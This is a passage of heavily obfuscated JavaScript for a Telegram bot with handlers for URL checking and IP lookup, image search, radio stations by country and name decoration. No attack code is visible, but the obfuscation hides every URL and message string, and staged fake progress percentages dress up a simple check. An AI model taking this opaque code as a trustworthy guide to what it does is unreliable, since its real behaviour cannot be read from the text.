            'rNmwn': _0x5bf670(0x44e) + _0x5bf670(0xc77) + _0x5bf670(0x6ed) + '0%',
            'uQJql': _0x5bf670(0x44e) + _0x5bf670(0xc77) + _0x5bf670(0x8bd) + '5%',
            'Moyra': _0x5bf670(0x44e) + _0x5bf670(0xc77) + _0x5bf670(0xc5a) + _0x5bf670(0x6e7),
            'wUJjm': function (_0x357208, _0x353c85) {
                return _0x357208(_0x353c85);
            },
            'LnYuv': function (_0x3f1e21, _0x3a99b0) {
                return _0x3f1e21(_0x3a99b0);
            },
            'qeyHH': function (_0x26f697, _0x5c76f1) {
                return _0x26f697(_0x5c76f1);
            },
            'VrVdT': function (_0x40ea1d, _0x145800) {
                return _0x40ea1d === _0x145800;
            },
            'VoGWU': _0x5bf670(0x578),
            'bwZOr': _0x5bf670(0x9f5) + _0x5bf670(0x71d) + _0x5bf670(0x282) + _0x5bf670(0x3a4),
            'ZJMWe': _0x5bf670(0x9b4),
            'NkEsS': _0x5bf670(0xce8) + _0x5bf670(0x6ca) + _0x5bf670(0xabf) + _0x5bf670(0x882) + _0x5bf670(0x92e) + _0x5bf670(0xad1) + _0x5bf670(0x475) + _0x5bf670(0xb10) + _0x5bf670(0x2a9) + _0x5bf670(0x76a) + _0x5bf670(0x646) + _0x5bf670(0x757) + _0x5bf670(0xc4f) + _0x5bf670(0x62f) + _0x5bf670(0x7cb) + _0x5bf670(0xafc) + _0x5bf670(0x5a9) + _0x5bf670(0x242) + _0x5bf670(0x2ac) + _0x5bf670(0x4b6) + _0x5bf670(0xca7),
            'rTSSF': _0x5bf670(0x905) + '🔴',
            'RfqvS': _0x5bf670(0x5f2) + _0x5bf670(0x76e) + _0x5bf670(0x8cf) + _0x5bf670(0x9af) + _0x5bf670(0x863) + _0x5bf670(0xb07) + _0x5bf670(0xa50) + _0x5bf670(0x807) + _0x5bf670(0x2e6) + _0x5bf670(0xaa4) + _0x5bf670(0x29f) + _0x5bf670(0x919) + _0x5bf670(0x42a) + _0x5bf670(0x679) + _0x5bf670(0x944) + _0x5bf670(0x90e) + _0x5bf670(0x38b),
            'jyxQP': function (_0xb1f321, _0x1a4932) {
                return _0xb1f321 || _0x1a4932;
            },
            'HMJJX': _0x5bf670(0x408) + _0x5bf670(0x211),
            'HCTWL': _0x5bf670(0xc89)
        }, _0x2603dd = _0x5eeb67[_0x5bf670(0x556)]['id'], _0x262377 = _0x5eeb67[_0x5bf670(0x8e5)];
    if (waiting_for_link[_0x2603dd]) {
        if (!_0x1faf28[_0x5bf670(0x75e)](isValidUrl, _0x262377)) {
            bot[_0x5bf670(0xb04) + 'e'](_0x2603dd, _0x1faf28[_0x5bf670(0x7cd)]);
            return;
        }
        let _0x422342 = await bot[_0x5bf670(0xb04) + 'e'](_0x2603dd, _0x1faf28[_0x5bf670(0xa02)]);
        await _0x1faf28[_0x5bf670(0x31d)](sleep, 0x1634 + 0x1072 + -0x7 * 0x34a), bot[_0x5bf670(0x382) + _0x5bf670(0x220)](_0x1faf28[_0x5bf670(0x6c2)], {
            'chat_id': _0x2603dd,
            'message_id': _0x422342[_0x5bf670(0x42f)]
        }), await _0x1faf28[_0x5bf670(0x31d)](sleep, 0xa9 * 0x2c + -0xbd * 0x1d + -0x5 * -0x199), bot[_0x5bf670(0x382) + _0x5bf670(0x220)](_0x1faf28[_0x5bf670(0xd33)], {
            'chat_id': _0x2603dd,
            'message_id': _0x422342[_0x5bf670(0x42f)]
        }), await _0x1faf28[_0x5bf670(0x75e)](sleep, -0xe00 + -0xdd5 + 0x2b75 * 0x1), bot[_0x5bf670(0x382) + _0x5bf670(0x220)](_0x1faf28[_0x5bf670(0x1c9)], {
            'chat_id': _0x2603dd,
            'message_id': _0x422342[_0x5bf670(0x42f)]
        }), await _0x1faf28[_0x5bf670(0x75e)](sleep, -0x1 * 0xec6 + -0x1c65 + 0x3acb), bot[_0x5bf670(0x382) + _0x5bf670(0x220)](_0x1faf28[_0x5bf670(0xaa2)], {
            'chat_id': _0x2603dd,
            'message_id': _0x422342[_0x5bf670(0x42f)]
        }), await _0x1faf28[_0x5bf670(0x313)](sleep, 0xf7 + 0x2eb + 0x1 * 0x6), bot[_0x5bf670(0x51f) + _0x5bf670(0x8a3)](_0x2603dd, _0x422342[_0x5bf670(0x42f)]);
        const _0x3b160b = _0x1faf28[_0x5bf670(0xca8)](checkUrl, _0x262377), _0x2987d4 = await _0x1faf28[_0x5bf670(0xca8)](extractIpFromUrl, _0x262377), _0x2edf51 = _0x2987d4 ? await _0x1faf28[_0x5bf670(0x643)](getIpInfo, _0x2987d4) : {};
        let _0x4724f0 = '';
        if (_0x1faf28[_0x5bf670(0x3b3)](_0x3b160b, _0x1faf28[_0x5bf670(0x2b8)]))
            _0x4724f0 = _0x1faf28[_0x5bf670(0xd08)];
        else {
            if (_0x1faf28[_0x5bf670(0x3b3)](_0x3b160b, _0x1faf28[_0x5bf670(0xc97)]))
                _0x4724f0 = _0x1faf28[_0x5bf670(0x27a)];
            else
                _0x1faf28[_0x5bf670(0x3b3)](_0x3b160b, _0x1faf28[_0x5bf670(0x7b8)]) && (_0x4724f0 = _0x1faf28[_0x5bf670(0x946)]);
        }
        const _0x115967 = _0x5bf670(0x1fa) + _0x5bf670(0xba8) + _0x262377 + (_0x5bf670(0x608) + _0x5bf670(0x3cb) + ':\x20') + _0x3b160b + (_0x5bf670(0x608) + _0x5bf670(0x8a1) + _0x5bf670(0x214)) + _0x4724f0 + (_0x5bf670(0x608) + _0x5bf670(0x940) + _0x5bf670(0x684)) + _0x1faf28[_0x5bf670(0x200)](_0x2987d4, _0x1faf28[_0x5bf670(0x466)]) + (_0x5bf670(0x608) + _0x5bf670(0x6f8) + _0x5bf670(0x19c)) + (_0x2edf51[_0x5bf670(0x602)] || _0x1faf28[_0x5bf670(0x3c4)]) + _0x5bf670(0xbe5);
        bot[_0x5bf670(0xb04) + 'e'](_0x2603dd, _0x115967), waiting_for_link[_0x2603dd] = ![];
    } else {
    }
});
const currentSearch = {};
bot[_0x298049(0x65c)](/\/stاههلىنححظةرلrt/, _0x3ab1b2 => {
    const _0x5a5552 = _0x298049, _0xdbc832 = {
            'jluQU': _0x5a5552(0x73c),
            'osHst': _0x5a5552(0x1b2) + _0x5a5552(0x1f2),
            'EgxgO': _0x5a5552(0x267) + _0x5a5552(0x613) + _0x5a5552(0x878) + _0x5a5552(0x46b) + _0x5a5552(0x3e0) + _0x5a5552(0x671) + '-'
        }, _0x4763c8 = _0x3ab1b2[_0x5a5552(0x556)]['id'], _0x4dcee3 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xdbc832[_0x5a5552(0xc3c)],
                            'callback_data': _0xdbc832[_0x5a5552(0xae6)]
                        }]]
            }
        };
    bot[_0x5a5552(0xb04) + 'e'](_0x4763c8, _0xdbc832[_0x5a5552(0x741)], _0x4dcee3);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x33d77a => {
    const _0x2f8ee3 = _0x298049, _0x1726a2 = {
            'iEjvb': function (_0x1d26f9, _0x47424f) {
                return _0x1d26f9 === _0x47424f;
            },
            'EXYXT': _0x2f8ee3(0x1b2) + _0x2f8ee3(0x1f2),
            'aFRTU': function (_0x30b5b8, _0x6c99fb) {
                return _0x30b5b8 === _0x6c99fb;
            },
            'HBAEM': _0x2f8ee3(0x65a) + _0x2f8ee3(0xab8),
            'chHyo': _0x2f8ee3(0x4df) + _0x2f8ee3(0x703) + _0x2f8ee3(0x2ce) + _0x2f8ee3(0xa31) + _0x2f8ee3(0x91a),
            'tXQBx': _0x2f8ee3(0x6c6) + _0x2f8ee3(0x911) + _0x2f8ee3(0x2f6) + _0x2f8ee3(0xd14) + _0x2f8ee3(0xb69) + _0x2f8ee3(0x752) + _0x2f8ee3(0x3bd) + _0x2f8ee3(0x999) + _0x2f8ee3(0xa71) + _0x2f8ee3(0x740) + _0x2f8ee3(0x79c) + _0x2f8ee3(0x569) + _0x2f8ee3(0x949) + _0x2f8ee3(0xc76) + _0x2f8ee3(0x8e0) + _0x2f8ee3(0x7dd) + _0x2f8ee3(0x894) + '\x20'
        }, _0x344d18 = _0x33d77a[_0x2f8ee3(0x33c)][_0x2f8ee3(0x556)]['id'];
    _0x1726a2[_0x2f8ee3(0x4dd)](_0x33d77a[_0x2f8ee3(0xc57)], _0x1726a2[_0x2f8ee3(0x4a8)]) && (_0x1726a2[_0x2f8ee3(0x977)](currentSearch[_0x344d18], _0x1726a2[_0x2f8ee3(0x9ea)]) ? bot[_0x2f8ee3(0xb04) + 'e'](_0x344d18, _0x1726a2[_0x2f8ee3(0x55e)]) : (bot[_0x2f8ee3(0xb04) + 'e'](_0x344d18, _0x1726a2[_0x2f8ee3(0x413)]), currentSearch[_0x344d18] = _0x1726a2[_0x2f8ee3(0x9ea)]));
}), bot['on'](_0x298049(0x33c), async _0x7c292 => {
    const _0xbf075 = _0x298049, _0x3cba9e = {
            'CzuRG': function (_0x25da3d, _0xb73391) {
                return _0x25da3d === _0xb73391;
            },
            'HUZFy': _0xbf075(0x65a) + _0xbf075(0xab8),
            'DLmpW': function (_0x367e24, _0x2e872f) {
                return _0x367e24(_0x2e872f);
            },
            'MDBiL': function (_0x4ff5f3, _0x19570d) {
                return _0x4ff5f3 === _0x19570d;
            },
            'nKkqo': _0xbf075(0x3a6) + _0xbf075(0xa69) + _0xbf075(0x39d),
            'JUGLc': function (_0x47fb33, _0x89bb03) {
                return _0x47fb33 < _0x89bb03;
            },
            'AlbuW': function (_0x37ef90, _0x17d29a) {
                return _0x37ef90 + _0x17d29a;
            },
            'wyiyd': _0xbf075(0xcdb) + _0xbf075(0xbb0) + _0xbf075(0x38c) + _0xbf075(0x753),
            'RyqTV': function (_0x2b2f5d, _0x2a287c) {
                return _0x2b2f5d !== _0x2a287c;
            }
        }, _0xa452f0 = _0x7c292[_0xbf075(0x556)]['id'];
    if (_0x3cba9e[_0xbf075(0x2c9)](currentSearch[_0xa452f0], _0x3cba9e[_0xbf075(0x904)])) {
        const _0x301e83 = _0x7c292[_0xbf075(0x8e5)], _0x3479b9 = _0xbf075(0x98a) + _0xbf075(0xa1a) + _0xbf075(0x216) + _0xbf075(0x6d8) + _0xbf075(0x94f) + _0xbf075(0x796) + _0xbf075(0x4f4) + _0xbf075(0x696) + _0xbf075(0x5a7) + _0x3cba9e[_0xbf075(0x912)](encodeURIComponent, _0x301e83) + (_0xbf075(0xd31) + _0xbf075(0x685) + _0xbf075(0x641)) + _0x3cba9e[_0xbf075(0x912)](encodeURIComponent, _0x301e83) + (_0xbf075(0x841) + _0xbf075(0x7d7) + _0xbf075(0x66b) + _0xbf075(0x89f) + _0xbf075(0x810));
        try {
            const _0x28e995 = await axios[_0xbf075(0x943)](_0x3479b9), _0x3fef7d = _0x28e995[_0xbf075(0xc57)][_0xbf075(0x4c9) + _0xbf075(0xbb2)]?.[_0xbf075(0xc57)]?.[_0xbf075(0x378)] || [];
            if (_0x3cba9e[_0xbf075(0x992)](_0x3fef7d[_0xbf075(0x825)], -0x2219 + -0x1 * -0x6d3 + 0x1b46 * 0x1)) {
                bot[_0xbf075(0xb04) + 'e'](_0xa452f0, _0x3cba9e[_0xbf075(0x80f)]), delete currentSearch[_0xa452f0];
                return;
            }
            for (let _0x8d994d = -0x1233 + -0x26bf + 0x38f2; _0x3cba9e[_0xbf075(0x85c)](_0x8d994d, _0x3fef7d[_0xbf075(0x825)]); _0x8d994d++) {
                const _0x5ebe8e = _0x3fef7d[_0x8d994d], _0x315a4a = _0x5ebe8e[_0xbf075(0xa47)]?.[_0xbf075(0x535)]?.[_0xbf075(0x9a2)];
                _0x315a4a ? bot[_0xbf075(0x8ab)](_0xa452f0, _0x315a4a, { 'caption': _0xbf075(0x5a8) + _0x3cba9e[_0xbf075(0xc50)](_0x8d994d, 0x1 * -0x123d + 0x1 * 0x1c12 + -0x9d4) }) : bot[_0xbf075(0xb04) + 'e'](_0xa452f0, _0x3cba9e[_0xbf075(0x77e)]);
            }
            delete currentSearch[_0xa452f0];
        } catch (_0xc7ffc6) {
            bot[_0xbf075(0xb04) + 'e'](_0xa452f0, _0xbf075(0x49e) + _0xc7ffc6[_0xbf075(0x33c)]), delete currentSearch[_0xa452f0];
        }
    } else {
        if (!currentSearch[_0xa452f0]) {
        } else {
            if (_0x3cba9e[_0xbf075(0xb27)](currentSearch[_0xa452f0], _0x3cba9e[_0xbf075(0x904)])) {
            }
        }
    }
});
async function fetchRadioStationsByCountry(_0x43c6bf, _0x183905 = 0x1823 + -0x1ffb * -0x1 + -0x37ec) {
    const _0x2a6f4a = _0x298049, _0x2da464 = { 'xbZfQ': _0x2a6f4a(0x40b) + _0x2a6f4a(0x514) + _0x2a6f4a(0xa17) }, _0x38c282 = _0x2a6f4a(0xd10) + _0x2a6f4a(0x4e0) + _0x2a6f4a(0x7f0) + _0x2a6f4a(0x4d8) + _0x2a6f4a(0x79f) + _0x2a6f4a(0x5ca) + _0x2a6f4a(0xbe6) + _0x43c6bf + _0x2a6f4a(0x1e6) + _0x183905;
    try {
        const _0x1a3d77 = await axios[_0x2a6f4a(0x943)](_0x38c282);
        return _0x1a3d77[_0x2a6f4a(0xc57)];
    } catch (_0x154199) {
        return console[_0x2a6f4a(0x7b5)](_0x2da464[_0x2a6f4a(0x437)], _0x154199), [];
    }
}
const radioCountries = {
    'AE': _0x298049(0x585),
    'SA': _0x298049(0x9d8),
    'YE': _0x298049(0xa42),
    'EG': _0x298049(0x98d),
    'JO': _0x298049(0x4e1),
    'QA': _0x298049(0x494),
    'BH': _0x298049(0x447),
    'KW': _0x298049(0xb4b),
    'OM': _0x298049(0x37c),
    'LB': _0x298049(0x1f3),
    'SY': _0x298049(0x9a6),
    'IQ': _0x298049(0xa4c),
    'MA': _0x298049(0x1fb),
    'DZ': _0x298049(0xaee),
    'TN': _0x298049(0x249),
    'LY': _0x298049(0x7e5),
    'SD': _0x298049(0x859),
    'PS': _0x298049(0x51a),
    'MR': _0x298049(0x592) + _0x298049(0x868),
    'SO': _0x298049(0x3a7),
    'DJ': _0x298049(0xa6d),
    'KM': _0x298049(0x98c) + _0x298049(0x59a),
    'AF': _0x298049(0xcda) + _0x298049(0x384),
    'AL': _0x298049(0x5ef),
    'AO': _0x298049(0x72a),
    'AR': _0x298049(0xbc8) + _0x298049(0x18c),
    'AM': _0x298049(0x538),
    'AU': _0x298049(0x258),
    'AT': _0x298049(0x65e),
    'AZ': _0x298049(0x7a7),
    'BD': _0x298049(0x2fe),
    'BY': _0x298049(0xa43),
    'BE': _0x298049(0x938),
    'BZ': _0x298049(0x737),
    'BJ': _0x298049(0x443),
    'BO': _0x298049(0x6d7),
    'BA': _0x298049(0x9fc) + _0x298049(0x239),
    'BW': _0x298049(0x95c),
    'BR': _0x298049(0xa9b),
    'BG': _0x298049(0x509),
    'BF': _0x298049(0x5bb) + _0x298049(0x3ed),
    'KH': _0x298049(0xc02),
    'CM': _0x298049(0xccb) + _0x298049(0x4af),
    'CA': _0x298049(0x314),
    'CL': _0x298049(0x991),
    'CN': _0x298049(0x6ae),
    'CO': _0x298049(0xa82),
    'CR': _0x298049(0x358) + _0x298049(0xc11),
    'HR': _0x298049(0x980),
    'CY': _0x298049(0x309),
    'CZ': _0x298049(0x4b8),
    'DK': _0x298049(0xc17),
    'EC': _0x298049(0xbd6) + _0x298049(0xa26),
    'EG': _0x298049(0x98d),
    'SV': _0x298049(0x558) + _0x298049(0xcba),
    'EE': _0x298049(0x52e),
    'ET': _0x298049(0x6de),
    'FI': _0x298049(0x9ae),
    'FR': _0x298049(0x5e9),
    'GE': _0x298049(0x490),
    'DE': _0x298049(0xb06),
    'GH': _0x298049(0x478),
    'GR': _0x298049(0x7e1),
    'GT': _0x298049(0x907) + _0x298049(0x736),
    'HN': _0x298049(0x450),
    'HK': _0x298049(0x23a) + _0x298049(0x86f),
    'HU': _0x298049(0x419),
    'IS': _0x298049(0x628),
    'IN': _0x298049(0x765),
    'ID': _0x298049(0x9b3) + _0x298049(0x653),
    'IR': _0x298049(0xca1),
    'IE': _0x298049(0xbc3),
    'IL': _0x298049(0x889),
    'IT': _0x298049(0xd29),
    'CI': _0x298049(0x7be) + _0x298049(0x324),
    'JP': _0x298049(0xaa5),
    'KZ': _0x298049(0x1d9) + _0x298049(0x5f0),
    'KE': _0x298049(0x661),
    'KG': _0x298049(0xaf7) + _0x298049(0x369),
    'LV': _0x298049(0x365),
    'LT': _0x298049(0x57d),
    'LU': _0x298049(0x964) + _0x298049(0x708),
    'MO': _0x298049(0x92f),
    'MY': _0x298049(0x1aa),
    'ML': _0x298049(0x357),
    'MT': _0x298049(0x476),
    'MX': _0x298049(0x60b),
    'MC': _0x298049(0x240),
    'MN': _0x298049(0x2d5),
    'ME': _0x298049(0x7d2) + _0x298049(0x78f),
    'MA': _0x298049(0x1fb),
    'MZ': _0x298049(0x36e),
    'MM': _0x298049(0x318),
    'NA': _0x298049(0x47c),
    'NP': _0x298049(0x302),
    'NL': _0x298049(0x397),
    'NZ': _0x298049(0x360) + _0x298049(0x44c),
    'NG': _0x298049(0xbc9),
    'KP': _0x298049(0xb59) + _0x298049(0x436),
    'NO': _0x298049(0x396),
    'PK': _0x298049(0xba7),
    'PS': _0x298049(0x51a),
    'PA': _0x298049(0x4c1),
    'PY': _0x298049(0xaa3),
    'PE': _0x298049(0x665),
    'PH': _0x298049(0xb03),
    'PL': _0x298049(0x6c9),
    'PT': _0x298049(0x834),
    'PR': _0x298049(0x315) + _0x298049(0xac1),
    'RO': _0x298049(0x9be),
    'RU': _0x298049(0x3d8),
    'RW': _0x298049(0x5ff),
    'SN': _0x298049(0x6a7),
    'RS': _0x298049(0x6b2),
    'SG': _0x298049(0x2a0),
    'SK': _0x298049(0xca2),
    'SI': _0x298049(0x2fb),
    'ZA': _0x298049(0x984) + _0x298049(0x639),
    'KR': _0x298049(0x642) + _0x298049(0x656),
    'ES': _0x298049(0x6dc),
    'LK': _0x298049(0x7fe),
    'SD': _0x298049(0x859),
    'SE': _0x298049(0x927),
    'CH': _0x298049(0x9a9),
    'SY': _0x298049(0x9a6),
    'TW': _0x298049(0x44b),
    'TZ': _0x298049(0x638),
    'TH': _0x298049(0xc18),
    'TG': _0x298049(0x746),
    'TN': _0x298049(0x249),
    'TR': _0x298049(0x981),
    'TM': _0x298049(0x56b) + _0x298049(0x215),
    'UG': _0x298049(0xa8e),
    'UA': _0x298049(0xac0),
    'AE': _0x298049(0x585),
    'GB': _0x298049(0xa06),
    'US': _0x298049(0x6d4),
    'UY': _0x298049(0x9c1),
    'UZ': _0x298049(0xb83) + _0x298049(0x795),
    'VE': _0x298049(0x4f1),
    'VN': _0x298049(0x1f9),
    'ZM': _0x298049(0x2e4),
    'ZW': _0x298049(0xa12),
    'GL': _0x298049(0x3a8),
    'KY': _0x298049(0x6a4) + _0x298049(0x48b),
    'NI': _0x298049(0x333) + _0x298049(0x4d0),
    'DO': _0x298049(0xa89) + _0x298049(0x4ba),
    'NC': _0x298049(0x7f8) + _0x298049(0xbe7),
    'LA': _0x298049(0x3e9),
    'TT': _0x298049(0x4bd) + _0x298049(0xae4),
    'GG': _0x298049(0x64a),
    'GU': _0x298049(0x5b1),
    'GP': _0x298049(0x2a5),
    'MG': _0x298049(0x3a3),
    'RE': _0x298049(0x527),
    'FO': _0x298049(0x232),
    'MD': _0x298049(0x304)
};
function splitRadioCountries(_0x4d46a5, _0x1d278e) {
    const _0x10ed6f = _0x298049, _0x1919a9 = {
            'SYXQa': function (_0x39033c, _0x169e76) {
                return _0x39033c < _0x169e76;
            },
            'rqxZx': function (_0xa5bf43, _0xbdf23e) {
                return _0xa5bf43 + _0xbdf23e;
            }
        };
    let _0x45f393 = [];
    for (let _0x24cdcb = -0x2119 + 0x1 * 0x18a + 0x1f8f; _0x1919a9[_0x10ed6f(0x5c5)](_0x24cdcb, _0x4d46a5[_0x10ed6f(0x825)]); _0x24cdcb += _0x1d278e) {
        _0x45f393[_0x10ed6f(0x39e)](_0x4d46a5[_0x10ed6f(0x69c)](_0x24cdcb, _0x1919a9[_0x10ed6f(0x7aa)](_0x24cdcb, _0x1d278e)));
    }
    return _0x45f393;
}
bot[_0x298049(0x65c)](/\/staㅎrtradㅎㅗio/, _0x5bd023 => {
    const _0x1878c7 = _0x298049, _0x415e56 = {
            'OVPLb': _0x1878c7(0xad4) + _0x1878c7(0x98b) + _0x1878c7(0x7d3),
            'sRXgs': _0x1878c7(0xb62) + _0x1878c7(0x51b) + '0',
            'wBkdl': _0x1878c7(0x41e) + _0x1878c7(0x8ce) + _0x1878c7(0x838) + _0x1878c7(0x9fe) + _0x1878c7(0xbd8) + _0x1878c7(0x2ff) + _0x1878c7(0x46d)
        }, _0x1890d6 = _0x5bd023[_0x1878c7(0x556)]['id'], _0x33c4d8 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x415e56[_0x1878c7(0x433)],
                            'callback_data': _0x415e56[_0x1878c7(0x631)]
                        }]]
            }
        };
    bot[_0x1878c7(0xb04) + 'e'](_0x1890d6, _0x415e56[_0x1878c7(0x59d)], _0x33c4d8);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x5a70a9 => {
    const _0x323135 = _0x298049, _0xf5a275 = {
            'wgDDd': function (_0x51b90a, _0x5a6a28) {
                return _0x51b90a === _0x5a6a28;
            },
            'SPEVj': function (_0x5ac75d, _0x4367b5) {
                return _0x5ac75d % _0x4367b5;
            },
            'NtDuu': function (_0x2e1168, _0x273018) {
                return _0x2e1168 - _0x273018;
            },
            'vsqBw': _0x323135(0xb62) + _0x323135(0x1a1),
            'MAyZM': function (_0x5b5a80, _0x463ab4, _0x244acb) {
                return _0x5b5a80(_0x463ab4, _0x244acb);
            },
            'KiZOZ': function (_0x4246d5, _0x357e89) {
                return _0x4246d5 < _0x357e89;
            },
            'hWgmn': _0x323135(0x362),
            'fuzAf': function (_0x213f04, _0x34b5ab) {
                return _0x213f04 + _0x34b5ab;
            },
            'psdtq': _0x323135(0x82a) + _0x323135(0x81d),
            'qavTf': _0x323135(0x896) + _0x323135(0x64d) + ':',
            'Ljbtj': _0x323135(0x26e),
            'kyTtB': _0x323135(0xa25) + _0x323135(0x281) + _0x323135(0xbc7) + '0%',
            'tZjmy': _0x323135(0x19a) + _0x323135(0x610),
            'ywZWb': _0x323135(0x2fa) + _0x323135(0xb43),
            'tIvLM': _0x323135(0x8f3) + _0x323135(0x80d),
            'kMAiU': _0x323135(0x31f) + _0x323135(0x71b),
            'VylSQ': function (_0x2f3d8c, _0x5b6d17) {
                return _0x2f3d8c(_0x5b6d17);
            }
        }, {
            data: _0x1231ce,
            message: _0x486fca
        } = _0x5a70a9;
    if (_0x1231ce[_0x323135(0x5cd)](_0xf5a275[_0x323135(0xae8)])) {
        const _0x1aa0b4 = _0xf5a275[_0x323135(0xa57)](parseInt, _0x1231ce[_0x323135(0xb11)]('_')[-0xb8a * -0x1 + -0x3 * 0x1b8 + -0x65f], -0x445 * -0x1 + 0x214b + 0x1 * -0x2586), _0x2fe14d = Object[_0x323135(0x3da)](radioCountries), _0x2c599a = _0xf5a275[_0x323135(0xa57)](splitRadioCountries, _0x2fe14d, -0xa56 + 0xad3 * -0x2 + 0x2042), _0x3899fc = [];
        _0x2c599a[_0x1aa0b4] && (_0x2c599a[_0x1aa0b4][_0x323135(0x9a0)](([_0xd2cd44, _0x19d25f], _0x5bba26) => {
            const _0x23aa1e = _0x323135;
            if (_0xf5a275[_0x23aa1e(0xb05)](_0xf5a275[_0x23aa1e(0xbb9)](_0x5bba26, 0x1cb1 + -0x1 * -0x1c8d + 0x82d * -0x7), -0xa3 * -0x27 + -0xa1f + -0xeb6))
                _0x3899fc[_0x23aa1e(0x39e)]([]);
            _0x3899fc[_0xf5a275[_0x23aa1e(0x956)](_0x3899fc[_0x23aa1e(0x825)], -0xb3 * -0x17 + -0x8eb + -0x27 * 0x2f)][_0x23aa1e(0x39e)]({
                'text': _0x19d25f,
                'callback_data': _0x23aa1e(0x26e) + _0xd2cd44
            });
        }), _0xf5a275[_0x323135(0xa55)](_0x1aa0b4, _0xf5a275[_0x323135(0x956)](_0x2c599a[_0x323135(0x825)], 0x1ade + 0x1 * 0x26e0 + -0x41bd)) && _0x3899fc[_0x323135(0x39e)]([{
                'text': _0xf5a275[_0x323135(0x812)],
                'callback_data': _0x323135(0xb62) + _0x323135(0x51b) + _0xf5a275[_0x323135(0x19b)](_0x1aa0b4, 0x21bf * 0x1 + -0xfb1 + -0x1 * 0x120d)
            }]));
        const _0x4aa64a = { 'reply_markup': { 'inline_keyboard': _0x3899fc } };
        _0xf5a275[_0x323135(0xb05)](_0x3899fc[_0x323135(0x825)], 0xa3b + 0x11c + 0x1 * -0xb57) ? await bot[_0x323135(0xb04) + 'e'](_0x486fca[_0x323135(0x556)]['id'], _0xf5a275[_0x323135(0x926)]) : await bot[_0x323135(0x382) + _0x323135(0x220)](_0xf5a275[_0x323135(0x77b)], {
            'chat_id': _0x486fca[_0x323135(0x556)]['id'],
            'message_id': _0x486fca[_0x323135(0x42f)],
            'reply_markup': _0x4aa64a[_0x323135(0xb54) + 'up']
        });
    }
    if (_0x1231ce[_0x323135(0x5cd)](_0xf5a275[_0x323135(0xac8)])) {
        const _0x2d110e = _0x1231ce[_0x323135(0xb11)]('_')[-0x1da * -0x10 + -0xaa * -0x25 + 0x1 * -0x3631], _0x48e562 = radioCountries[_0x2d110e];
        let _0x15f262 = await bot[_0x323135(0xb04) + 'e'](_0x486fca[_0x323135(0x556)]['id'], _0xf5a275[_0x323135(0x5c8)]);
        const _0xa57140 = [
            _0xf5a275[_0x323135(0x36c)],
            _0xf5a275[_0x323135(0xb9a)],
            _0xf5a275[_0x323135(0x6f0)],
            _0xf5a275[_0x323135(0xa08)]
        ];
        for (let _0x4d7038 = -0xb95 + 0x1f2d * 0x1 + 0x108 * -0x13; _0xf5a275[_0x323135(0xa55)](_0x4d7038, _0xa57140[_0x323135(0x825)]); _0x4d7038++) {
            await new Promise(_0x3803d7 => setTimeout(_0x3803d7, 0x1bea + -0x50b + -0xf0f)), await bot[_0x323135(0x382) + _0x323135(0x220)](_0x323135(0xa25) + _0x323135(0x1c3) + _0xa57140[_0x4d7038], {
                'chat_id': _0x486fca[_0x323135(0x556)]['id'],
                'message_id': _0x15f262[_0x323135(0x42f)]
            });
        }
        await new Promise(_0x16c287 => setTimeout(_0x16c287, -0x92b + 0x1bb0 + -0xe9d)), await bot[_0x323135(0x51f) + _0x323135(0x8a3)](_0x486fca[_0x323135(0x556)]['id'], _0x15f262[_0x323135(0x42f)]);
        const _0x5772a9 = await _0xf5a275[_0x323135(0xc87)](fetchRadioStationsByCountry, _0x2d110e);
        let _0x280403 = _0x5772a9[_0x323135(0x825)] ? _0x323135(0x1ce) + _0x323135(0x874) + _0x323135(0xada) + _0x48e562 + ':\x0a' : _0x323135(0x21b) + _0x323135(0x76b) + _0x323135(0x1ef) + _0x48e562 + '.';
        _0x5772a9[_0x323135(0x69c)](-0x2 * 0xbd3 + -0x1 * -0xfe5 + -0x7c1 * -0x1, 0x437 + 0x8d6 + -0x1 * 0xce5)[_0x323135(0x9a0)](_0x1e6244 => {
            const _0x229835 = _0x323135;
            _0x280403 += _0x229835(0xcb0) + ':\x20' + _0x1e6244[_0x229835(0xd02)] + (_0x229835(0x235) + ':\x20') + _0x1e6244[_0x229835(0x9a2)] + '\x0a\x0a';
        }), bot[_0x323135(0xb04) + 'e'](_0x486fca[_0x323135(0x556)]['id'], _0x280403);
    }
});
const userStates = {};
async function زخرفة_الاسم(_0x3b2b11) {
    const _0x48b9a1 = _0x298049, _0x193e0c = {
            'XPndv': function (_0x91010d, _0x4e87b8) {
                return _0x91010d(_0x4e87b8);
            },
            'ZcghG': _0x48b9a1(0x22b) + _0x48b9a1(0xa35) + _0x48b9a1(0x726) + _0x48b9a1(0x36b),
            'HStOA': _0x48b9a1(0x584) + _0x48b9a1(0x465),
            'FpoVS': _0x48b9a1(0xd0c),
            'fuAIY': _0x48b9a1(0x2a7) + _0x48b9a1(0x756) + _0x48b9a1(0x25b) + _0x48b9a1(0x34b),
            'ocuEv': _0x48b9a1(0x9c3) + _0x48b9a1(0xa9e) + _0x48b9a1(0x38a) + _0x48b9a1(0x870) + _0x48b9a1(0x4d3),
            'oWLua': _0x48b9a1(0xa7f) + _0x48b9a1(0xa62) + _0x48b9a1(0x4eb) + _0x48b9a1(0x9b2) + _0x48b9a1(0x777) + _0x48b9a1(0x21e) + _0x48b9a1(0x942) + _0x48b9a1(0x691) + _0x48b9a1(0x8c8) + _0x48b9a1(0xb7d) + _0x48b9a1(0xa4b) + '6',
            'YSyzV': _0x48b9a1(0xd02),
            'lekYy': _0x48b9a1(0x943),
            'FWxFf': function (_0x28d1d3, _0x3e9f1e) {
                return _0x28d1d3 === _0x3e9f1e;
            },
            'IYvIh': function (_0x222af0, _0x1574a5) {
                return _0x222af0(_0x1574a5);
            },
            'LiLvJ': _0x48b9a1(0x9e5) + _0x48b9a1(0xa7b) + _0x48b9a1(0x7e8) + 'n'
        }, _0x1c8be6 = _0x193e0c[_0x48b9a1(0x8f1)], _0x126306 = {
            'authority': _0x193e0c[_0x48b9a1(0xc33)],
            'accept': _0x193e0c[_0x48b9a1(0xa19)],
            'accept-language': _0x193e0c[_0x48b9a1(0xbcb)],
            'content-type': _0x193e0c[_0x48b9a1(0x2c4)],
            'user-agent': _0x193e0c[_0x48b9a1(0x3af)]
        }, _0x5ad7f5 = new URLSearchParams();
